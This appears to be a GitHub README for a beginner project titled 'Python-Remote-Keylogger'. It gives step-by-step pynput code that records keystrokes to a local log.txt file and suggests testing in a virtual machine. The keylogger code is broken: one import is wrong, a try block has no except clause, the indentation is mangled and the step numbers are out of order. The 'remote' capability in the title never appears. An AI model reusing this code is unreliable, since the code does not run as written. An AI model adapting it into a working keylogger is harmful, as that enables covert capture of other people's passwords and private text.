# Python-Remote-Keylogger-
Creating a python keylogger to record keystrokes remotely. 

# Objective:

Build a Python-based keylogger to:
	
 1.	Record keystrokes locally.
	
 2.	Save them to a log file.
	

# Prerequisites:
	
 1.	Programming Knowledge: Basic understanding of Python.
	
 2.	Environment: Python installed on your system.
	
 3.	Libraries: Install the necessary Python libraries:
	
 	pynput (to capture keystrokes).
	
 

Install dependencies:

pip install pynput

![Screenshot 2025-01-06 232309](https://github.com/user-attachments/assets/8e696666-3e46-4c1d-a94a-1a1cdbef4d26)



# Step 1: Capture Keystrokes
	
 
 1.	Import the pynput library:

		from pynput.keyboard import pynput


2.    Define a function for file handling:

  			with open("log.txt", "w") as log:
    			log.write("")
  

	
  4.	Define a function to log keystrokes:


			def on_press(key):

 try:
 
 		with open("log.txt", "a") as log:
          	log.write(f"{key}\n")


	
 4.	Set up the key listener:


		with 
 		pynput.keyboard.Listener(on_press=on_press) as listener:
    		listener.join()


![Screenshot 2025-01-08 230006](https://github.com/user-attachments/assets/eb3f5535-5c59-45b4-b06c-47830bb21aea)



# Step 2: Test in a Virtual Environment
	
 Run the keylogger in a controlled environment (e.g., a virtual machine) to observe its functionality. I'm running it on the terminal in visual code.

 ![Screenshot 2025-01-08 230235](https://github.com/user-attachments/assets/29b800d0-6277-4c8f-87d2-7b98488e86e6)



# Step 3: Save Logs to a File


The captured keystrokes will be saved to a file named log.txt in the same directory as the script.

![Screenshot 2025-01-08 000119](https://github.com/user-attachments/assets/77cee983-9701-499f-82e3-82d7dd409981)



